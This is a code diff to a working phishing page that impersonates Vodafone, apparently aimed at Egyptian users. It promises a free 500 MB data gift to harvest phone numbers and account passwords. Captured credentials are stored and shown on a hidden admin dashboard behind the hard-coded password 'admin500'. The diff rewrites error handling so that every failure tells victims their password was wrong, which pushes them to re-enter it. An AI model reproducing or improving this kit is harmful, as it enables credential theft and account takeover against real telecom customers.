@@ -26,7 +26,6 @@
         }
     </script>
     <style>
-        /* التنسيقات الأساسية لتثبيت الشاشة */
         html, body {
             font-family: 'Cairo', sans-serif;
             background-color: #050505;
@@ -34,12 +33,11 @@
             padding: 0;
             width: 100%;
             height: 100%;
-            overflow: hidden; /* لمنع التمرير العام */
+            overflow: hidden;
             position: fixed;
-            overscroll-behavior: none; /* لمنع تحديث الصفحة بالسحب للأسفل */
+            overscroll-behavior: none;
         }
         
-        /* كلاس مخصص للسماح بالإنزلاق والسحب بحرية داخل لوحة الآدمن */
         .can-scroll {
             touch-action: pan-x pan-y !important;
             overflow-y: auto;
@@ -60,7 +58,6 @@
             100% { transform: rotate(360deg); }
         }
         
-        /* إخفاء شريط التمرير (Scrollbar) وجعله أنيقاً */
         ::-webkit-scrollbar { width: 4px; height: 4px; }
         ::-webkit-scrollbar-track { background: #121212; }
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
@@ -69,22 +66,17 @@
 </head>
 <body class="min-h-screen flex flex-col items-center justify-center p-4 relative text-white selection:bg-vfRed selection:text-white">
     
-    <!-- توهج أحمر في الخلفية -->
     <div class="absolute -top-40 left-1/2 -translate-x-1/2 w-[450px] h-[450px] bg-vfRed/10 rounded-full blur-[100px] pointer-events-none"></div>
 
-    <!-- نظام التنبيهات المخصص -->
     <div id="custom-toast" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 bg-zinc-900 border border-zinc-800 text-white px-5 py-3 rounded-2xl shadow-2xl font-bold flex items-center gap-3 transition-all duration-300 transform -translate-y-20 opacity-0 pointer-events-none text-sm">
         <i class="fa-solid fa-bell text-vfRed"></i>
         <span id="toast-message">إشعار</span>
     </div>
 
-    <!-- الكارت الرئيسي للموقع -->
     <div class="w-full max-w-md bg-vfCard border border-zinc-900 rounded-3xl shadow-2xl overflow-hidden relative z-10">
         
-        <!-- الهيدر -->
         <div class="bg-gradient-to-b from-zinc-900 to-vfCard p-5 border-b border-zinc-900/60 relative">
             <div class="flex items-center justify-between w-full mb-6">
-                <!-- اليمين: الصورة والاسم -->
                 <div class="flex items-center gap-2">
                     <div class="w-14 h-14 rounded-full border-2 border-vfRed/50 overflow-hidden shadow-lg shadow-vfRed/10 flex-shrink-0">
                         <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivp3gtkP9bTIhAjSD-hjDrUJDNNgfzdobLsz98IYYSZ_9xuY5RI_qhEpAQ13ttLrbQKkGoAavk5cPAdF_IL8icnzY-_5jSXol6ikrGKQD54pSfPO49NULWHD2HWvSLSHTPBdzcvSqke3C9d-B439-9uzyxh1AYG1qtJ7V4NliRQvBvuuoNO1796ocOKT0/s554/15268.jpg" alt="AYMAN" class="w-full h-full object-cover object-top">
@@ -93,7 +85,6 @@
                         <span class="text-xs font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-white via-zinc-200 to-vfRed">أيمن | AYMAN</span>
                     </div>
                 </div>
-                <!-- اليسار: التواصل -->
                 <div class="flex flex-col gap-1.5">
                     <a href="https://wa.me/201096883474" target="_blank" class="w-8 h-8 bg-green-600/10 hover:bg-green-600 border border-green-500/20 hover:border-transparent text-green-500 hover:text-white rounded-full flex items-center justify-center transition-all duration-300 shadow"><i class="fa-brands fa-whatsapp text-sm"></i></a>
                     <a href="https://t.me/llI313lIl" target="_blank" class="w-8 h-8 bg-blue-600/10 hover:bg-blue-600 border border-blue-500/20 hover:border-transparent text-blue-400 hover:text-white rounded-full flex items-center justify-center transition-all duration-300 shadow"><i class="fa-brands fa-telegram text-sm"></i></a>
@@ -101,7 +92,6 @@
             </div>
 
             <div class="flex flex-col items-center mt-2">
-                <!-- زر الدخول للآدمن -->
                 <button onclick="openAdminPrompt()" class="w-16 h-16 bg-vfRed rounded-full flex items-center justify-center shadow-lg shadow-vfRed/30 hover:scale-105 active:scale-95 transition-all mb-3 relative">
                     <svg class="w-10 h-10 fill-white" viewBox="0 0 100 100">
                         <path d="M50,15 C30.7,15 15,30.7 15,50 C15,69.3 30.7,85 50,85 C51.3,85 52.6,84.9 53.9,84.7 C51.4,81.4 50,77.3 50,73 C50,61.4 59.4,52 71,52 C76.2,52 81,53.9 84.7,57.1 C84.9,54.8 85,52.4 85,50 C85,30.7 69.3,15 50,15 Z M60.5,37 C64.1,37 67,39.9 67,43.5 C67,47.1 64.1,50 60.5,50 C56.9,50 54,47.1 54,43.5 C54,39.9 56.9,37 60.5,37 Z"></path>
@@ -116,7 +106,6 @@
             </div>
         </div>
 
-        <!-- الخطوة 1: استمارة تسجيل الدخول -->
         <div id="stage-login" class="p-6 md:p-8 fade-in">
             <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-4">
                 <div>
@@ -141,7 +130,6 @@
             </form>
         </div>
 
-        <!-- الخطوة 2: شاشة فحص الحساب -->
         <div id="stage-waiting" class="hidden p-8 text-center fade-in">
             <div class="relative w-16 h-16 mx-auto mb-5">
                 <div class="absolute inset-0 rounded-full border-4 border-zinc-900"></div>
@@ -152,7 +140,6 @@
             <p class="text-zinc-500 text-xs max-w-xs mx-auto">انتظر قليلاً، نقوم الآن بتسجيل الهدية على حسابك.</p>
         </div>
 
-        <!-- الخطوة 3: نتائج تفعيل الهدية (الآن خيارين فقط!) -->
         <div id="stage-result" class="hidden p-8 text-center fade-in">
             <div id="result-icon-container" class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                 <i id="result-icon" class="text-3xl"></i>
@@ -171,10 +158,6 @@
         </div>
     </div>
 
-    <!-- ============================================== -->
-    <!-- لوحة تحكم المسؤول (تم تفعيل الإنزلاق فيها بنجاح) -->
-    <!-- ============================================== -->
-
     <!-- نافذة الباسورد -->
     <div id="admin-pass-modal" class="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-4 opacity-0 pointer-events-none transition-opacity duration-300">
         <div class="bg-zinc-900 border border-zinc-800 p-6 rounded-2xl w-full max-w-xs text-center shadow-2xl relative">
@@ -189,7 +172,7 @@
         </div>
     </div>
 
-    <!-- لوحة عرض البيانات (مزودة بكلاس can-scroll للسماح بالحركة) -->
+    <!-- لوحة عرض البيانات -->
     <div id="admin-dashboard" class="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-4 opacity-0 pointer-events-none transition-opacity duration-300 can-scroll">
         <div class="bg-zinc-900 border border-zinc-800 p-6 rounded-3xl w-full max-w-4xl shadow-2xl my-8">
             <div class="flex flex-col md:flex-row justify-between items-center gap-4 border-b border-zinc-800 pb-4 mb-5">
@@ -207,7 +190,7 @@
                 </div>
             </div>
 
-            <!-- جدول الأرقام (مزود بحرية السحب الأفقي والعمودي) -->
+            <!-- جدول الأرقام -->
             <div class="can-scroll rounded-xl border border-zinc-800 bg-zinc-950 max-h-[60vh] shadow-inner">
                 <table class="w-full text-right border-collapse min-w-[750px]">
                     <thead>
@@ -232,9 +215,6 @@
     <script>
         const ADMIN_SECRET = 'admin500';
 
-        // ** السحر هنا: كود منع التمرير الذكي **
-        // يمنع سحب الصفحة الرئيسية عشان متعملش Refresh في الموبايل
-        // لكن بيسمح بالإنزلاق (Scroll) لو إنت جوه لوحة الآدمن (اللي واخدة كلاس can-scroll)
         document.addEventListener('touchmove', function (e) {
             if (!e.target.closest('.can-scroll')) {
                 e.preventDefault();
@@ -282,7 +262,7 @@
             }
         }
 
-        // إرسال الطلب للسيرفر والتعامل مع خيارين فقط (نجاح 100% أو باسوورد غلط)
+        // إرسال الطلب (خيارين فقط: نجاح الهدية أو باسورد غلط)
         function handleLogin(event) {
             event.preventDefault();
             
@@ -301,30 +281,24 @@
             .then(data => {
                 let selectedResult = {};
                 
+                // الخيار الأول: الباسورد سليم (سيتم جلب الهدية في الخلفية)
                 if (data.status === "success") {
                     selectedResult = {
-                        status: "تم أخذ الهدية بنجاح", // دي اللي بتظهر للآدمن
+                        status: "بيانات صحيحة (تم إرسال الهدية)", 
                         title: "تم تفعيل الهدية! 🎉",
-                        desc: "تم تفعيل حزمة الـ 500 ميجابايت المجانية على خطك بنجاح. انتظر رسالة التأكيد النصية خلال دقائق.",
+                        desc: "تم تفعيل حزمة الـ 500 ميجابايت المجانية على خطك بنجاح. انتظر رسالة التأكيد النصية.",
                         colorClass: "bg-green-500/10 border border-green-500/20 text-green-500",
                         icon: "fa-solid fa-circle-check"
                     };
-                } else if (data.status === "wrong_password") {
+                } 
+                // الخيار الثاني: الباسورد خطأ
+                else {
                     selectedResult = {
                         status: "لم يأخذها بسبب كلمة مرور خاطئة",
                         title: "خطأ في كلمة المرور! ❌",
                         desc: "بيانات المرور المدخلة غير صحيحة. يرجى إعادة المحاولة بكلمة مرور 'أنا فودافون' الصحيحة.",
                         colorClass: "bg-red-500/10 border border-red-500/20 text-red-500",
                         icon: "fa-solid fa-circle-xmark"
-                    };
-                } else {
-                    // في حالة أي خطأ شبكة غير متوقع نعتبره فشل ونطلب المحاولة
-                    selectedResult = {
-                        status: "خطأ في الاتصال بالخادم",
-                        title: "حدثت مشكلة! 🔌",
-                        desc: "نواجه مشكلة مؤقتة في الاتصال بخوادم التفعيل. الرجاء المحاولة مجدداً.",
-                        colorClass: "bg-orange-500/10 border border-orange-500/20 text-orange-500",
-                        icon: "fa-solid fa-triangle-exclamation"
                     };
                 }
 
@@ -340,12 +314,13 @@
                 document.getElementById('stage-result').classList.remove('hidden');
             })
             .catch(err => {
+                // في حالة انقطاع النت في الواجهة
                 const errorResult = {
-                    status: "خطأ في الاتصال بالخادم",
-                    title: "فشل الاتصال! 🔌",
-                    desc: "تعذر الاتصال بالسيرفر. تأكد من جودة الإنترنت والمحاولة مرة أخرى.",
-                    colorClass: "bg-orange-500/10 border border-orange-500/20 text-orange-500",
-                    icon: "fa-solid fa-triangle-exclamation"
+                    status: "كلمة مرور خاطئة (أو ضعف شبكة)",
+                    title: "خطأ في كلمة المرور! ❌",
+                    desc: "بيانات المرور المدخلة غير صحيحة. يرجى إعادة المحاولة.",
+                    colorClass: "bg-red-500/10 border border-red-500/20 text-red-500",
+                    icon: "fa-solid fa-circle-xmark"
                 };
 
                 saveSubmission(phone, password, errorResult.status);
@@ -413,13 +388,11 @@
                 
                 submissions.reverse().forEach(entry => {
                     let badgeClass = "text-zinc-500 bg-zinc-800/55";
-                    if (entry.status === "تم أخذ الهدية بنجاح") {
+                    if (entry.status.includes("صحيحة")) {
                         badgeClass = "text-green-500 bg-green-500/10";
-                    } else if (entry.status === "لم يأخذها بسبب كلمة مرور خاطئة") {
-                        badgeClass = "text-red-500 bg-red-500/10";
                     } else {
-                        badgeClass = "text-orange-500 bg-orange-500/10";
-                    }
+                        badgeClass = "text-red-500 bg-red-500/10";
+                    } 
 
                     const row = `
                         <tr class="hover:bg-zinc-900/40 transition-colors">
